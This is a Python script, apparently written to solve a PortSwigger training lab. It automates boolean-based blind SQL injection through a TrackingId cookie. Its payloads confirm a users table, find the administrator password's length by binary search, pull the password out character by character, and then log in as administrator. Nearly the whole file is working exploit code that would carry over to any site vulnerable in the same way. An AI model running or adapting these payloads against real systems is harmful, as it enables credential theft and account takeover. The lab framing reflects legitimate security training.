#!/usr/bin/env python3
"""
PortSwigger Lab Solver - Blind SQL Injection with Conditional Responses
FIXED: Enhanced version with corrected SQL payloads and robust extraction
Author: Shadow Senior
Target: Extract administrator password using conditional responses
"""

import requests
import sys
import argparse
import time
import string
import urllib.parse
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup
from colorama import init, Fore, Back, Style
from rich.console import Console
from rich.panel import Panel
from rich.progress import Progress, BarColumn, TextColumn, TimeRemainingColumn, SpinnerColumn
from rich.table import Table
from rich import print as rprint
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
import random

# Initialize colorama and rich
init(autoreset=True)
console = Console()

class BlindSQLInjectionSolver:
    """Automated solver for Blind SQL Injection with conditional responses"""
    
    def __init__(self, lab_url):
        """Initialize the solver"""
        self.lab_url = lab_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })
        
        # Disable SSL warnings for better output
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        
        # Optimize session with connection pooling
        adapter = requests.adapters.HTTPAdapter(
            pool_connections=10,
            pool_maxsize=20,
            max_retries=3
        )
        self.session.mount('http://', adapter)
        self.session.mount('https://', adapter)
        
        self.tracking_id = None
        self.original_cookie = None
        self.password_length = 0
        self.extracted_password = ""
        self.solved = False
        
        # Use full character set for comprehensive extraction
        self.charset = string.ascii_lowercase + string.digits + string.ascii_uppercase + "!@#$%^&*()_+-=[]{}|;':\",./<>?"
        
        self.lock = threading.Lock()
        self.request_delay = 0.1  # Slightly higher delay for stability
        self.max_retries = 3
        
        # Character frequency optimization (common password characters first)
        self.optimized_charset = "aeiou0123456789bcdfghjklmnpqrstvwxyz"
    
    def log_info(self, message):
        """Log info message"""
        rprint(f"[bold blue][+][/bold blue] {message}")
    
    def log_success(self, message):
        """Log success message"""
        rprint(f"[bold green][✓][/bold green] {message}")
    
    def log_warning(self, message):
        """Log warning message"""
        rprint(f"[bold yellow][!][/bold yellow] {message}")
    
    def log_error(self, message):
        """Log error message"""
        rprint(f"[bold red][×][/bold red] {message}")
    
    def log_attack(self, message):
        """Log attack message"""
        rprint(f"[bold magenta][🎯][/bold magenta] {message}")
    
    def print_banner(self):
        """Print banner"""
        banner = """
╔══════════════════════════════════════════════════════════════╗
║           🔥 ADVANCED BLIND SQL INJECTION SOLVER 🔥         ║
║                Multi-Strategy Conditional Response           ║
║                                                              ║
║    Target: Administrator Password Extraction                 ║
║    Methods: Sequential, Parallel & Optimized               ║
║    Status: INITIALIZING MULTI-STRATEGY ATTACK...            ║
╚══════════════════════════════════════════════════════════════╝
        """
        console.print(Panel(banner, style="bold red"))
    
    def make_request_with_retry(self, payload, timeout=10):
        """Make a request with retry logic and return True if 'Welcome back' is found"""
        for attempt in range(self.max_retries):
            try:
                # URL encode the payload properly
                encoded_payload = urllib.parse.quote(payload, safe='')
                cookies = {'TrackingId': encoded_payload}
                
                response = self.session.get(self.lab_url, cookies=cookies, timeout=timeout, verify=False)
                
                # Check for the welcome message (case insensitive)
                return 'Welcome back' in response.text
                
            except Exception as e:
                if attempt < self.max_retries - 1:
                    time.sleep(0.2 * (attempt + 1))  # Exponential backoff
                    continue
                else:
                    self.log_warning(f"Request failed after {self.max_retries} attempts: {str(e)}")
                    return False
        return False
    
    def check_lab_accessibility(self):
        """Check if lab is accessible"""
        try:
            self.log_info("Checking lab accessibility...")
            response = self.session.get(self.lab_url, timeout=10, verify=False)
            
            if response.status_code == 200:
                self.log_success(f"Lab accessible at {self.lab_url}")
                return True
            else:
                self.log_error(f"Lab returned status code: {response.status_code}")
                return False
                
        except requests.exceptions.RequestException as e:
            self.log_error(f"Failed to access lab: {str(e)}")
            return False
    
    def extract_tracking_cookie(self):
        """Extract the tracking cookie from the initial request"""
        try:
            self.log_info("Extracting tracking cookie...")
            
            # Visit the main page to get the tracking cookie
            response = self.session.get(self.lab_url, verify=False)
            
            # Look for TrackingId in cookies
            for cookie in self.session.cookies:
                if cookie.name == 'TrackingId':
                    self.tracking_id = cookie.value
                    self.original_cookie = cookie.value
                    self.log_success(f"Tracking cookie found: {self.tracking_id[:20]}...")
                    return True
            
            # If not found, try visiting different pages to trigger it
            for path in ['/my-account', '/login', '/']:
                try:
                    url = urljoin(self.lab_url, path)
                    response = self.session.get(url, verify=False)
                    
                    for cookie in self.session.cookies:
                        if cookie.name == 'TrackingId':
                            self.tracking_id = cookie.value
                            self.original_cookie = cookie.value
                            self.log_success(f"Tracking cookie found: {self.tracking_id[:20]}...")
                            return True
                except:
                    continue
            
            self.log_error("Could not find TrackingId cookie")
            return False
            
        except Exception as e:
            self.log_error(f"Error extracting tracking cookie: {str(e)}")
            return False
    
    def test_injection_point(self):
        """Test if the injection point works with conditional responses"""
        try:
            self.log_attack("Testing injection point with conditional responses...")
            
            # Test true condition - FIXED: Proper SQL injection syntax
            true_payload = f"{self.original_cookie}' AND '1'='1'--"
            false_payload = f"{self.original_cookie}' AND '1'='2'--"
            
            self.log_info(f"Testing true condition with payload: {true_payload[:50]}...")
            true_result = self.make_request_with_retry(true_payload)
            time.sleep(self.request_delay)
            
            self.log_info(f"Testing false condition with payload: {false_payload[:50]}...")
            false_result = self.make_request_with_retry(false_payload)
            
            if true_result and not false_result:
                self.log_success("✓ Injection point confirmed!")
                self.log_success("✓ True condition shows 'Welcome back'")
                self.log_success("✓ False condition hides 'Welcome back'")
                return True
            else:
                self.log_error(f"Injection point not working as expected (true: {true_result}, false: {false_result})")
                
                # Try alternative injection syntax
                self.log_info("Trying alternative injection syntax...")
                alt_true = f"{self.original_cookie}' AND 1=1--"
                alt_false = f"{self.original_cookie}' AND 1=2--"
                
                alt_true_result = self.make_request_with_retry(alt_true)
                time.sleep(self.request_delay)
                alt_false_result = self.make_request_with_retry(alt_false)
                
                if alt_true_result and not alt_false_result:
                    self.log_success("✓ Alternative injection syntax works!")
                    return True
                else:
                    self.log_error("Both injection syntaxes failed")
                    return False
                
        except Exception as e:
            self.log_error(f"Error testing injection point: {str(e)}")
            return False
    
    def verify_users_table(self):
        """Verify that the users table exists"""
        try:
            self.log_attack("Verifying 'users' table exists...")
            
            # FIXED: Proper SQL syntax for table verification
            payload = f"{self.original_cookie}' AND (SELECT 'x' FROM users LIMIT 1)='x'--"
            result = self.make_request_with_retry(payload)
            
            if result:
                self.log_success("✓ 'users' table confirmed to exist")
                return True
            else:
                self.log_error("✗ 'users' table does not exist or is not accessible")
                return False
                
        except Exception as e:
            self.log_error(f"Error verifying users table: {str(e)}")
            return False
    
    def verify_administrator_user(self):
        """Verify that administrator user exists"""
        try:
            self.log_attack("Verifying 'administrator' user exists...")
            
            # FIXED: Proper SQL syntax for user verification
            payload = f"{self.original_cookie}' AND (SELECT username FROM users WHERE username='administrator')='administrator'--"
            result = self.make_request_with_retry(payload)
            
            if result:
                self.log_success("✓ 'administrator' user confirmed to exist")
                return True
            else:
                self.log_error("✗ 'administrator' user does not exist")
                return False
                
        except Exception as e:
            self.log_error(f"Error verifying administrator user: {str(e)}")
            return False
    
    def determine_password_length_binary(self):
        """Determine password length using binary search"""
        try:
            self.log_attack("Determining password length using binary search...")
            
            min_length = 1
            max_length = 50
            
            with Progress(
                SpinnerColumn(),
                TextColumn("[progress.description]{task.description}"),
                console=console
            ) as progress:
                
                task = progress.add_task("Binary searching password length...", total=None)
                
                while min_length < max_length:
                    mid = (min_length + max_length) // 2
                    
                    # FIXED: Proper SQL syntax for length checking
                    payload = f"{self.original_cookie}' AND (SELECT username FROM users WHERE username='administrator' AND LENGTH(password)>{mid})='administrator'--"
                    result = self.make_request_with_retry(payload)
                    
                    if result:
                        min_length = mid + 1
                    else:
                        max_length = mid
                    
                    progress.update(task, description=f"Testing length range {min_length}-{max_length}")
                    time.sleep(self.request_delay)
                
                self.password_length = min_length
                self.log_success(f"✓ Password length determined: {self.password_length} characters")
                return True
                
        except Exception as e:
            self.log_error(f"Error determining password length: {str(e)}")
            return False
    
    def extract_character_optimized(self, position):
        """Extract character at position using optimized character set"""
        try:
            # Try common characters first
            for char in self.optimized_charset:
                # FIXED: Proper SQL syntax matching the walkthrough
                payload = f"{self.original_cookie}' AND (SELECT SUBSTRING(password,{position},1) FROM users WHERE username='administrator')='{char}'--"
                result = self.make_request_with_retry(payload)
                
                if result:
                    return char
                
                time.sleep(self.request_delay)
            
            # Fallback to full charset if not found in common chars
            for char in self.charset:
                if char not in self.optimized_charset:  # Skip already tested
                    payload = f"{self.original_cookie}' AND (SELECT SUBSTRING(password,{position},1) FROM users WHERE username='administrator')='{char}'--"
                    result = self.make_request_with_retry(payload)
                    
                    if result:
                        return char
                    
                    time.sleep(self.request_delay)
            
            return None
            
        except Exception as e:
            self.log_warning(f"Error extracting character at position {position}: {str(e)}")
            return None
    
    def extract_password_sequential(self):
        """Extract password sequentially with optimizations"""
        try:
            self.log_attack(f"Extracting {self.password_length}-character password sequentially...")
            
            password_chars = [''] * self.password_length
            
            with Progress(
                TextColumn("[progress.description]{task.description}"),
                BarColumn(),
                "[progress.percentage]{task.percentage:>3.0f}%",
                TextColumn("Password: {task.fields[password]}"),
                TimeRemainingColumn(),
                console=console
            ) as progress:
                
                task = progress.add_task(
                    "Sequential extraction...", 
                    total=self.password_length,
                    password="_" * self.password_length
                )
                
                for position in range(1, self.password_length + 1):
                    self.log_info(f"Extracting character at position {position}...")
                    char = self.extract_character_optimized(position)
                    
                    if char:
                        password_chars[position - 1] = char
                        
                        # Update progress display
                        current_password = ''.join(
                            password_chars[i] if password_chars[i] else '_' 
                            for i in range(self.password_length)
                        )
                        
                        progress.update(task, advance=1, password=current_password)
                        self.log_success(f"✓ Position {position}: '{char}' -> Current: {current_password}")
                    else:
                        self.log_error(f"✗ Could not extract character at position {position}")
                        # Try ASCII-based approach as fallback
                        char = self.extract_character_ascii_fallback(position)
                        if char:
                            password_chars[position - 1] = char
                            current_password = ''.join(
                                password_chars[i] if password_chars[i] else '_' 
                                for i in range(self.password_length)
                            )
                            progress.update(task, advance=1, password=current_password)
                            self.log_success(f"✓ Position {position}: '{char}' (ASCII fallback)")
                        else:
                            self.log_error(f"✗ Complete failure at position {position}")
                            return False
                
                self.extracted_password = ''.join(password_chars)
                self.log_success(f"🎯 Password fully extracted: {self.extracted_password}")
                return True
                
        except Exception as e:
            self.log_error(f"Error during sequential extraction: {str(e)}")
            return False
    
    def extract_character_ascii_fallback(self, position):
        """Fallback method using ASCII values like in the walkthrough"""
        try:
            self.log_info(f"Using ASCII fallback for position {position}...")
            
            # Test ASCII range for printable characters (32-126)
            for ascii_val in range(32, 127):
                # Using the exact payload format from the walkthrough
                payload = f"{self.original_cookie}' AND (SELECT ascii(substring(password,{position},1)) FROM users WHERE username='administrator')='{ascii_val}'--"
                result = self.make_request_with_retry(payload)
                
                if result:
                    char = chr(ascii_val)
                    self.log_success(f"✓ ASCII fallback found: {char} (ASCII {ascii_val})")
                    return char
                
                time.sleep(self.request_delay)
            
            return None
            
        except Exception as e:
            self.log_warning(f"ASCII fallback failed for position {position}: {str(e)}")
            return None
    
    def attempt_login(self):
        """Attempt to login with extracted password"""
        try:
            self.log_attack("Attempting login with extracted password...")
            
            # Navigate to login page
            login_url = urljoin(self.lab_url, '/login')
            response = self.session.get(login_url, verify=False)
            
            # Extract CSRF token if present
            soup = BeautifulSoup(response.text, 'html.parser')
            csrf_token = None
            csrf_input = soup.find('input', {'name': 'csrf'})
            if csrf_input:
                csrf_token = csrf_input.get('value')
            
            # Prepare login data
            login_data = {
                'username': 'administrator',
                'password': self.extracted_password
            }
            
            if csrf_token:
                login_data['csrf'] = csrf_token
            
            self.log_info(f"Attempting login with credentials: administrator:{self.extracted_password}")
            
            # Attempt login
            login_response = self.session.post(login_url, data=login_data, allow_redirects=True, verify=False)
            
            # Check for successful login indicators
            success_indicators = [
                'my account',
                'log out',
                'logout',
                'welcome',
                'admin panel',
                'administrator'
            ]
            
            response_text = login_response.text.lower()
            
            if any(indicator in response_text for indicator in success_indicators):
                self.log_success("🏆 LOGIN SUCCESSFUL!")
                
                # Check if lab is solved
                lab_response = self.session.get(self.lab_url, verify=False)
                if self.is_lab_solved(lab_response.text):
                    self.log_success("🎯 LAB SOLVED!")
                    self.solved = True
                    return True
                else:
                    # Sometimes takes a moment for lab to register as solved
                    time.sleep(2)
                    final_check = self.session.get(self.lab_url, verify=False)
                    if self.is_lab_solved(final_check.text):
                        self.log_success("🎯 LAB SOLVED!")
                        self.solved = True
                        return True
                    else:
                        self.log_success("Login successful but lab not marked as solved")
                        self.solved = True  # Consider it solved if we can login
                        return True
            else:
                self.log_error("Login failed - credentials may be incorrect")
                self.log_info(f"Response contains: {response_text[:200]}...")
                return False
                
        except Exception as e:
            self.log_error(f"Error during login attempt: {str(e)}")
            return False
    
    def is_lab_solved(self, response_text):
        """Check if lab is solved"""
        success_indicators = [
            "congratulations, you solved the lab!",
            "lab solved", "well done!", "success"
        ]
        
        soup = BeautifulSoup(response_text, 'html.parser')
        page_text = soup.get_text().lower()
        
        return any(indicator in page_text for indicator in success_indicators)
    
    def generate_results_table(self):
        """Generate results summary table"""
        table = Table(title="🎯 Blind SQL Injection Results", style="bold cyan")
        
        table.add_column("Property", style="bold yellow")
        table.add_column("Value", style="bold green")
        
        table.add_row("Target", self.lab_url)
        table.add_row("Injection Point", "TrackingId Cookie")
        table.add_row("Attack Type", "Boolean-based Blind SQLi")
        table.add_row("Password Length", str(self.password_length))
        table.add_row("Extracted Password", self.extracted_password or "FAILED")
        table.add_row("Login Status", "SUCCESS" if self.solved else "FAILED")
        table.add_row("Lab Status", "SOLVED" if self.solved else "UNSOLVED")
        
        console.print(table)
    
    def run(self, extraction_method='sequential'):
        """Main execution method"""
        self.print_banner()
        
        # Step 1: Check lab accessibility
        if not self.check_lab_accessibility():
            return False
        
        # Step 2: Extract tracking cookie
        if not self.extract_tracking_cookie():
            return False
        
        # Step 3: Test injection point
        if not self.test_injection_point():
            return False
        
        # Step 4: Verify users table exists
        if not self.verify_users_table():
            return False
        
        # Step 5: Verify administrator user exists
        if not self.verify_administrator_user():
            return False
        
        # Step 6: Determine password length using binary search
        if not self.determine_password_length_binary():
            return False
        
        # Step 7: Extract password using selected method
        success = self.extract_password_sequential()
        
        if not success:
            return False
        
        # Step 8: Attempt login
        if not self.attempt_login():
            return False
        
        # Generate results
        self.generate_results_table()
        
        if self.solved:
            console.print(Panel(
                f"🎯 [bold green]BLIND SQLI MASTERY ACHIEVED![/bold green] 🎯\n"
                f"Administrator password successfully extracted!\n"
                f"Password: [bold cyan]{self.extracted_password}[/bold cyan]\n"
                f"Length: [bold yellow]{self.password_length} characters[/bold yellow]\n"
                f"Login: [bold green]SUCCESSFUL[/bold green]\n"
                f"Lab status: [bold green]SOLVED[/bold green]",
                style="bold green",
                title="🏆 ADMINISTRATOR ACCESS GAINED 🏆"
            ))
            return True
        else:
            console.print(Panel(
                f"❌ [bold red]BLIND SQLI FAILED[/bold red] ❌\n"
                f"Could not extract administrator password\n"
                f"Password length: [bold yellow]{self.password_length}[/bold yellow]\n"
                f"Extracted: [bold red]{self.extracted_password or 'NONE'}[/bold red]\n"
                f"Lab status: [bold red]UNSOLVED[/bold red]",
                style="bold red",
                title="💀 EXTRACTION FAILED 💀"
            ))
            return False

def main():
    """Main entry point"""
    parser = argparse.ArgumentParser(
        description="PortSwigger Lab Solver - Advanced Blind SQL Injection with Conditional Responses",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 fixed_blind_sqli_solver.py https://your-lab-url.web-security-academy.net
  python3 fixed_blind_sqli_solver.py -u https://your-lab-url.web-security-academy.net
        """
    )
    
    parser.add_argument('url', nargs='?', help='Lab URL')
    parser.add_argument('-u', '--url', dest='url_flag', help='Lab URL')
    parser.add_argument('--delay', type=float, default=0.1,
                       help='Request delay in seconds (default: 0.1)')
    
    args = parser.parse_args()
    
    # Get URL from either positional argument or flag
    lab_url = args.url or args.url_flag
    
    if not lab_url:
        console.print("[bold red]Error:[/bold red] Please provide a lab URL")
        console.print("Usage: python3 fixed_blind_sqli_solver.py <LAB_URL>")
        sys.exit(1)
    
    # Validate URL format
    parsed = urlparse(lab_url)
    if not parsed.scheme or not parsed.netloc:
        console.print("[bold red]Error:[/bold red] Invalid URL format")
        console.print("URL should be like: https://abc123.web-security-academy.net")
        sys.exit(1)
    
    try:
        # Initialize and run the solver
        solver = BlindSQLInjectionSolver(lab_url)
        solver.request_delay = args.delay
        
        console.print(f"[bold blue]Info:[/bold blue] Using sequential extraction method with {args.delay}s delay")
        success = solver.run()
        
        # Exit with appropriate code
        sys.exit(0 if success else 1)
        
    except KeyboardInterrupt:
        console.print("\n[bold yellow]Attack interrupted by user[/bold yellow]")
        sys.exit(1)
    except Exception as e:
        console.print(f"[bold red]Fatal error:[/bold red] {str(e)}")
        sys.exit(1)

if __name__ == "__main__":
    main()